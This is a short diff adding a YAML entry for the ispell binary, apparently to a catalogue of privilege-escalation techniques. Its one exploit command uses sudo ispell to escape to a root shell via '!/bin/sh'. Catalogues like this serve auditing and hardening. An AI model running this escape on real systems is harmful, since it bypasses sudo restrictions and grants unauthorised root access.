@@ -1,0 +1,4 @@
+name: ispell
+binary_path: /usr/bin/ispell
+exploit_cmds:
+- sudo /usr/bin/ispell /etc/hosts && !/bin/sh
